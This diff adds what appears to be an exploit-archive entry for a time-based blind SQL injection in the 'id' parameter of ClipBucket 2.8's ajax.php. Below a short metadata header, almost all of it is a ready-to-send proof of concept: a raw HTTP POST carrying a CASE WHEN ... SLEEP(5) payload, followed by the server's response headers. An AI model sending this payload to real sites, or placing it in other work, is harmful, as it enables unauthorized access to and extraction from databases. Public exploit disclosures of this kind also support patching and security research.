@@ -1,0 +1,37 @@
+# Exploit Title: ClipBucket 2.8 - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-10-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://clipbucket.com/
+# Software Link: https://sourceforge.net/projects/clipbucket/files/latest/download
+# Version: 2.8.v3354
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/ajax.php
+ 
+POST /[PATH]/ajax.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=fuobifeugni2gnt2kir6patce6
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+mode=rating&id=(CASE%20WHEN%20(112=112)%20THEN%20SLEEP(5)%20ELSE%20112%20END)&rating=5&type=user
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 20:22:48 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 828
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
